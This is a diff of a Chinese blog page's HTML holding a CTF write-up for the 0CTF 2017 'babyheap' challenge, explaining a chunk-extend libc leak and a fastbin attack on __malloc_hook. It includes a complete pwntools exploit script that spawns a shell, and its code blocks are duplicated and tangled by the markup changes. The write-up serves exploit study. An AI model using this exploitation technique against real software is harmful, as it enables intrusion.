+<figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre class=" language-hljs python">alloc(<span class="hljs-number">0x18</span>)<span class="hljs-comment">#0</span><br>alloc(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#1</span><br>alloc(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#2</span><br>alloc(<span class="hljs-number">0x18</span>)<span class="hljs-comment"><code class="language-hljs python">alloc(<span class="hljs-number">0x18</span>)<span class="hljs-comment">#0</span><br>alloc(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#1</span><br>alloc(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#2</span><br>alloc(<span class="hljs-number">0x18</span>)<span class="hljs-comment">#3</span><br></code></pre></td></tr></tbody></table></figure>
 <p>alloc0x18实际上分配了0x20大小的堆，alloc0x68实际上分配了0x70大小的堆<br>然后我们fill0号堆，造成单字节溢出，即溢出到1号堆的size位，修改size为size(1)+size(2)，即0xe1(1为上一个堆是否处于分配状态的标志位)</p>
-<pre class=" language-python"><code class="language-python">payload<span class="token operator">=</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x18</span>
-payload<span class="token operator">+=</span>p8<span class="token punctuation">(</span><span class="token number">0xe1</span><span class="token punctuation">)</span>
-fill<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span></code></pre>
+<figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs python">payload=<span class="hljs-string">'A'</span>*<span class="hljs-number">0x18</span><br>payload+=p8(<span class="hljs-number">0xe1</span>)<br>fill(<span class="hljs-number"><code class="language-hljs python">payload=<span class="hljs-string">'A'</span>*<span class="hljs-number">0x18</span><br>payload+=p8(<span class="hljs-number">0xe1</span>)<br>fill(<span class="hljs-number">0</span>,payload)<br></code></pre></td></tr></tbody></table></figure>
 <p>这样1号堆实际上就包括了1号堆和2号堆，属于small chunk.接下来我们free1号堆，当1号堆被free之后，按照规定会被放入unsorted bin当中，大小为0xe1,此时1号堆的fd和bk指针都存放着unsorted bin的表头<br>(需要注意，free掉1号堆后，实际上2号堆仍然处于已分配状态)<br>然后我们再alloc一个大小为0x60的堆，这样就从unsorted bin当中割除一块，即割除了原本属于1号堆的那一块分配给了新堆，剩下的那一块就是属于2号堆的那一块，unsorted bin的表头的转移到了2号堆的fd和bk当中<br>而2号堆仍然处于使用状态，这样我们就可以通过dump操作泄露出libc</p>
-<pre class=" language-python"><code class="language-python">free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
-alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#1</span>
-leak<span class="token operator">=</span>u64<span class="token punctuation">(</span>dump<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre>
+<figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs python">free(<span class="hljs-number">1</span>)<br>alloc(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#1</span><br>leak=u64(dump(<span class="hljs-number">2</span>)[:<span class="hljs-number"><code class="language-hljs python">free(<span class="hljs-number">1</span>)<br>alloc(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#1</span><br>leak=u64(dump(<span class="hljs-number">2</span>)[:<span class="hljs-number">8</span>])<br></code></pre></td></tr></tbody></table></figure>
 <p><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/8.jpg" alt=""><br>偏移为0x7f5a68c3db78-0x7f5a68879000=0x3C4B78‬</p>
-<pre class=" language-python"><code class="language-python">libc<span class="token operator">=</span>leak<span class="token number">-0x3c4b78</span>
-__malloc_hook<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x3c4b10</span>
-one_gadget<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x4526a</span>
-log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"leak => 0x%x"</span> <span class="token operator">%</span> leak<span class="token punctuation">)</span>
-log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"libc => 0x%x"</span> <span class="token operator">%</span> libc<span class="token punctuation">)</span>
-log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"__malloc_hook => 0x%x"</span> <span class="token operator">%</span> __malloc_hook<span class="token punctuation">)</span>
-log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"one_gadget => 0x%x"</span> <span class="token operator">%</span> one_gadget<span class="token punctuation">)</span></code></pre>
+<figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre class=" language-hljs python">libc=leak<span class="hljs-number">-0x3c4b78</span><br>__malloc_hook=libc+<span class="hljs-number">0x3c4b10</span><br>one_gadget=libc+<span class="hljs-number">0x4526a</span><br>log.info(<span class="hljs-string">"leak =&gt; 0x%x"</span> % leak)<br>log.info(<span class="hljs-string">"libc =&gt; 0x%x"</span> % libc)<br>log.info(<span class="hljs-string">"__malloc_hook =&gt; 0x%x"</span> % __malloc_hook)<br>log.info(<span class="hljs-string"><code class="language-hljs python">libc=leak<span class="hljs-number">-0x3c4b78</span><br>__malloc_hook=libc+<span class="hljs-number">0x3c4b10</span><br>one_gadget=libc+<span class="hljs-number">0x4526a</span><br>log.info(<span class="hljs-string">"leak =&gt; 0x%x"</span> % leak)<br>log.info(<span class="hljs-string">"libc =&gt; 0x%x"</span> % libc)<br>log.info(<span class="hljs-string">"__malloc_hook =&gt; 0x%x"</span> % __malloc_hook)<br>log.info(<span class="hljs-string">"one_gadget => 0x%x"</span> % one_gadget)<br></code></pre></td></tr></tbody></table></figure>
 <p>泄露出libc地址后，利用就已经完成了一大半了<br>由于开启了Full RELRO，复写got表就不可行了，我们这里可通过覆盖__malloc_hook指针为one_gadget来起shell</p>
-<pre class=" language-bash"><code class="language-bash">malloc_hook
-最常见也是最容易的一种堆利用方法。
-malloc函数会首先检查malloc_hook的值，若不为0则会调用他。若我们能通过内存写入malloc_hook即可实现任意地址跳转
-通过fastbin_attack攻击malloc_hook</code></pre>
+<figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre class=" language-hljs bash"><code class="language-hljs bash">malloc_hook<br>最常见也是最容易的一种堆利用方法。<br>malloc函数会首先检查malloc_hook的值，若不为0则会调用他。若我们能通过内存写入malloc_hook即可实现任意地址跳转<br>通过fastbin_attack攻击malloc_hook<br></code></pre></td></tr></tbody></table></figure>
 <p>观察一下malloc_hook周围的数据的分布<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/9.jpg" alt=""><br>似乎并没有满足条件fastbin条件的数据，但只要我们稍微调整一下数据分布，看到__malloc_hook-0x23<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/10.jpg" alt=""><br>7f正好满足fastbin大小的限制，如图所示<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/11.jpg" alt=""><br>补充好相应的知识以后，就可以开始构造了<br>我们再alloc一个0x60大小的4号堆，实际上4号堆和2号堆是公用的<br>然后free掉2号堆，这个时候bins如下<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/12.jpg" alt=""><br>我们再通过fill4号堆把2号堆的fd指针指向mallac_hook-0x23处</p>
-<pre class=" language-python"><code class="language-python">alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>
-free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
-payload<span class="token operator">=</span>p64<span class="token punctuation">(</span>__malloc_hook<span class="token number">-0x23</span><span class="token punctuation">)</span>
-fill<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span></code></pre>
+<figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre class=" language-hljs python">alloc(<span class="hljs-number">0x68</span>)<br>free(<span class="hljs-number">2</span>)<br>payload=p64(__malloc_hook<span class="hljs-number">-0x23</span>)<br>fill(<span class="hljs-number"><code class="language-hljs python">alloc(<span class="hljs-number">0x68</span>)<br>free(<span class="hljs-number">2</span>)<br>payload=p64(__malloc_hook<span class="hljs-number">-0x23</span>)<br>fill(<span class="hljs-number">4</span>,payload)<br></code></pre></td></tr></tbody></table></figure>
 <p>看看现在的bins<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/13.jpg" alt=""><br>指向了<strong>malloc_hook-0x23处，我们只需要alloc2次，就能把堆分配到</strong>malloc_hook-0x23</p>
-<pre class=" language-python"><code class="language-python">alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>
-alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span></code></pre>
+<figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class=" language-hljs python">alloc(<span class="hljs-number">0x68</span>)<br>alloc(<span class="hljs-number"><code class="language-hljs python">alloc(<span class="hljs-number">0x68</span>)<br>alloc(<span class="hljs-number">0x68</span>)<br></code></pre></td></tr></tbody></table></figure>
 <p>接下来就只需要按照上面关于的<strong>malloc_hook的图进行填充即可，把one_gadget的地址填入</strong>malloc_hook处，然后再alloc任意大小的堆即可触发one_gadget从而拿到shell</p>
-<pre class=" language-python"><code class="language-python">payload<span class="token operator">=</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">0x13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span>
-fill<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
-
-alloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre class=" language-hljs python">payload=<span class="hljs-string">'b'</span>*<span class="hljs-number">0x13</span>+p64(one_gadget)<br>fill(<span class="hljs-number">5</span>,payload)<br><br>alloc(<span class="hljs-number"><code class="language-hljs python">payload=<span class="hljs-string">'b'</span>*<span class="hljs-number">0x13</span>+p64(one_gadget)<br>fill(<span class="hljs-number">5</span>,payload)<br><br>alloc(<span class="hljs-number">1</span>)<br>io.interactive()<br></code></pre></td></tr></tbody></table></figure>
 <p>完整exp如下</p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-<span class="token comment" spellcheck="true">#context.log_level = "debug"</span>
-io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./babyheap_0ctf_2017'</span><span class="token punctuation">)</span>
-<span class="token comment" spellcheck="true">#io=remote('node3.buuoj.cn',29849)</span>
-
-<span class="token keyword">def</span> <span class="token function">alloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">)</span>
-    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
-    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">)</span>
-    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-
-<span class="token keyword">def</span> <span class="token function">fill</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">)</span>
-    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>
-    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span>
-    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
-    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">)</span>
-    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">)</span>
-    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">)</span>
-    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>
-    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span>
-    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">dump</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">)</span>
-    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>
-    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span>
-    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
-    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content: \n"</span><span class="token punctuation">)</span>
-    data<span class="token operator">=</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    <span class="token keyword">return</span> data
-
-alloc<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>
-alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>
-alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>
-alloc<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>
-
-payload<span class="token operator">=</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x18</span>
-payload<span class="token operator">+=</span>p8<span class="token punctuation">(</span><span class="token number">0xe1</span><span class="token punctuation">)</span>
-fill<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
-free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
-
-alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>
-leak<span class="token operator">=</span>u64<span class="token punctuation">(</span>dump<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-libc<span class="token operator">=</span>leak<span class="token number">-0x3c4b78</span>
-__malloc_hook<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x3c4b10</span>
-one_gadget<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x4526a</span>
-log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"leak => 0x%x"</span> <span class="token operator">%</span> leak<span class="token punctuation">)</span>
-log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"libc => 0x%x"</span> <span class="token operator">%</span> libc<span class="token punctuation">)</span>
-log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"__malloc_hook => 0x%x"</span> <span class="token operator">%</span> __malloc_hook<span class="token punctuation">)</span>
-log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"one_gadget => 0x%x"</span> <span class="token operator">%</span> one_gadget<span class="token punctuation">)</span>
-
-alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>
-free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
-payload<span class="token operator">=</span>p64<span class="token punctuation">(</span>__malloc_hook<span class="token number">-0x23</span><span class="token punctuation">)</span>
-fill<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
-alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>
-alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>
-
-payload<span class="token operator">=</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">0x13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span>
-fill<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
-
-alloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre class=" language-hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level = "debug"</span><br>io = process(<span class="hljs-string">'./babyheap_0ctf_2017'</span>)<br><span class="hljs-comment">#io=remote('node3.buuoj.cn',29849)</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">alloc</span><span class="hljs-params">(size)</span>:</span><br>    io.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    io.sendline(<span class="hljs-string">'1'</span>)<br>    io.recvuntil(<span class="hljs-string">"Size: "</span>)<br>    io.sendline(str(size))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fill</span><span class="hljs-params">(index, content)</span>:</span><br>    io.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    io.sendline(<span class="hljs-string">'2'</span>)<br>    io.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    io.sendline(str(index))<br>    io.recvuntil(<span class="hljs-string">"Size: "</span>)<br>    io.sendline(str(len(content)))<br>    io.recvuntil(<span class="hljs-string">"Content: "</span>)<br>    io.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(index)</span>:</span><br>    io.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    io.sendline(<span class="hljs-string">'3'</span>)<br>    io.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    io.sendline(str(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dump</span><span class="hljs-params">(index)</span>:</span><br>    io.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    io.sendline(<span class="hljs-string">'4'</span>)<br>    io.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    io.sendline(str(index))<br>    io.recvuntil(<span class="hljs-string">"Content: \n"</span>)<br>    data=io.recvline()<br>    <span class="hljs-keyword">return</span> data<br><br>alloc(<span class="hljs-number">0x18</span>)<br>alloc(<span class="hljs-number">0x68</span>)<br>alloc(<span class="hljs-number">0x68</span>)<br>alloc(<span class="hljs-number">0x18</span>)<br><br>payload=<span class="hljs-string">'A'</span>*<span class="hljs-number">0x18</span><br>payload+=p8(<span class="hljs-number">0xe1</span>)<br>fill(<span class="hljs-number">0</span>,payload)<br>free(<span class="hljs-number">1</span>)<br><br>alloc(<span class="hljs-number">0x68</span>)<br>leak=u64(dump(<span class="hljs-number">2</span>)[:<span class="hljs-number">8</span>])<br>libc=leak<span class="hljs-number">-0x3c4b78</span><br>__malloc_hook=libc+<span class="hljs-number">0x3c4b10</span><br>one_gadget=libc+<span class="hljs-number">0x4526a</span><br>log.info(<span class="hljs-string">"leak =&gt; 0x%x"</span> % leak)<br>log.info(<span class="hljs-string">"libc =&gt; 0x%x"</span> % libc)<br>log.info(<span class="hljs-string">"__malloc_hook =&gt; 0x%x"</span> % __malloc_hook)<br>log.info(<span class="hljs-string">"one_gadget =&gt; 0x%x"</span> % one_gadget)<br><br>alloc(<span class="hljs-number">0x68</span>)<br>free(<span class="hljs-number">2</span>)<br>payload=p64(__malloc_hook<span class="hljs-number">-0x23</span>)<br>fill(<span class="hljs-number">4</span>,payload)<br>alloc(<span class="hljs-number">0x68</span>)<br>alloc(<span class="hljs-number">0x68</span>)<br><br>payload=<span class="hljs-string">'b'</span>*<span class="hljs-number">0x13</span>+p64(one_gadget)<br>fill(<span class="hljs-number">5</span>,payload)<br><br>alloc(<span class="hljs-number"><code class="language-hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level = "debug"</span><br>io = process(<span class="hljs-string">'./babyheap_0ctf_2017'</span>)<br><span class="hljs-comment">#io=remote('node3.buuoj.cn',29849)</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">alloc</span><span class="hljs-params">(size)</span>:</span><br>    io.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    io.sendline(<span class="hljs-string">'1'</span>)<br>    io.recvuntil(<span class="hljs-string">"Size: "</span>)<br>    io.sendline(str(size))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fill</span><span class="hljs-params">(index, content)</span>:</span><br>    io.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    io.sendline(<span class="hljs-string">'2'</span>)<br>    io.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    io.sendline(str(index))<br>    io.recvuntil(<span class="hljs-string">"Size: "</span>)<br>    io.sendline(str(len(content)))<br>    io.recvuntil(<span class="hljs-string">"Content: "</span>)<br>    io.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(index)</span>:</span><br>    io.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    io.sendline(<span class="hljs-string">'3'</span>)<br>    io.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    io.sendline(str(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dump</span><span class="hljs-params">(index)</span>:</span><br>    io.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    io.sendline(<span class="hljs-string">'4'</span>)<br>    io.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    io.sendline(str(index))<br>    io.recvuntil(<span class="hljs-string">"Content: \n"</span>)<br>    data=io.recvline()<br>    <span class="hljs-keyword">return</span> data<br><br>alloc(<span class="hljs-number">0x18</span>)<br>alloc(<span class="hljs-number">0x68</span>)<br>alloc(<span class="hljs-number">0x68</span>)<br>alloc(<span class="hljs-number">0x18</span>)<br><br>payload=<span class="hljs-string">'A'</span>*<span class="hljs-number">0x18</span><br>payload+=p8(<span class="hljs-number">0xe1</span>)<br>fill(<span class="hljs-number">0</span>,payload)<br>free(<span class="hljs-number">1</span>)<br><br>alloc(<span class="hljs-number">0x68</span>)<br>leak=u64(dump(<span class="hljs-number">2</span>)[:<span class="hljs-number">8</span>])<br>libc=leak<span class="hljs-number">-0x3c4b78</span><br>__malloc_hook=libc+<span class="hljs-number">0x3c4b10</span><br>one_gadget=libc+<span class="hljs-number">0x4526a</span><br>log.info(<span class="hljs-string">"leak =&gt; 0x%x"</span> % leak)<br>log.info(<span class="hljs-string">"libc =&gt; 0x%x"</span> % libc)<br>log.info(<span class="hljs-string">"__malloc_hook =&gt; 0x%x"</span> % __malloc_hook)<br>log.info(<span class="hljs-string">"one_gadget =&gt; 0x%x"</span> % one_gadget)<br><br>alloc(<span class="hljs-number">0x68</span>)<br>free(<span class="hljs-number">2</span>)<br>payload=p64(__malloc_hook<span class="hljs-number">-0x23</span>)<br>fill(<span class="hljs-number">4</span>,payload)<br>alloc(<span class="hljs-number">0x68</span>)<br>alloc(<span class="hljs-number">0x68</span>)<br><br>payload=<span class="hljs-string">'b'</span>*<span class="hljs-number">0x13</span>+p64(one_gadget)<br>fill(<span class="hljs-number">5</span>,payload)<br><br>alloc(<span class="hljs-number">1</span>)<br>io.interactive()<br></code></pre></td></tr></tbody></table></figure>
 <p><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/14.jpg" alt=""><br>成功</p>
 <script>
         document.querySelectorAll('.github-emoji')
@@ -608,553 +243,112 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
             document.body.appendChild(img);
           });
       </script>
-            </div>
-            <hr/>
-
-            
-
-    <div class="reprint" id="reprint-statement">
+    </main>
+    <footer class="post-footer">
+      
+      <div class="post-tags">
         
-            <div class="reprint__author">
-                <span class="reprint-meta" style="font-weight: bold;">
-                    <i class="fas fa-user">
-                        文章作者:
-                    </i>
-                </span>
-                <span class="reprint-info">
-                    <a href="http://LawlietLW.github.io" rel="external nofollow noreferrer">LawlietLW</a>
-                </span>
-            </div>
-            <div class="reprint__type">
-                <span class="reprint-meta" style="font-weight: bold;">
-                    <i class="fas fa-link">
-                        文章链接:
-                    </i>
-                </span>
-                <span class="reprint-info">
-                    <a href="http://LawlietLW.github.io/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/">http://LawlietLW.github.io/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/</a>
-                </span>
-            </div>
-            <div class="reprint__notice">
-                <span class="reprint-meta" style="font-weight: bold;">
-                    <i class="fas fa-copyright">
-                        版权声明:
-                    </i>
-                </span>
-                <span class="reprint-info">
-                    本博客所有文章除特別声明外，均采用
-                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
-                    许可协议。转载请注明来源
-                    <a href="http://LawlietLW.github.io" target="_blank">LawlietLW</a>
-                    !
-                </span>
-            </div>
+        <a class="post-tag button" href="/LawlietLW.github.io/tags/pwn/" rel="tag"><i class="fas fa-tags"></i>pwn</a>
         
+        <a class="post-tag button" href="/LawlietLW.github.io/tags/%E5%A0%86/" rel="tag"><i class="fas fa-tags"></i>堆</a>
+        
+        <a class="post-tag button" href="/LawlietLW.github.io/tags/fastbin-attack/" rel="tag"><i class="fas fa-tags"></i>fastbin attack</a>
+        
+        <a class="post-tag button" href="/LawlietLW.github.io/tags/chunk-extend/" rel="tag"><i class="fas fa-tags"></i>chunk extend</a>
+        
+      </div>
+      
+    </footer>
+  </article>
+  
+  
+  <nav class="page-nav">
+    <div class="page-nav-next page-nav-item">
+      
+      <a href="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/" rel="next" title="BUUCTF pwn1_sctf_2016"><i class="fas fa-angle-left"></i><span class="nav-title">BUUCTF pwn1_sctf_2016</span></a>
+      
     </div>
-
-    <script async defer>
-      document.addEventListener("copy", function (e) {
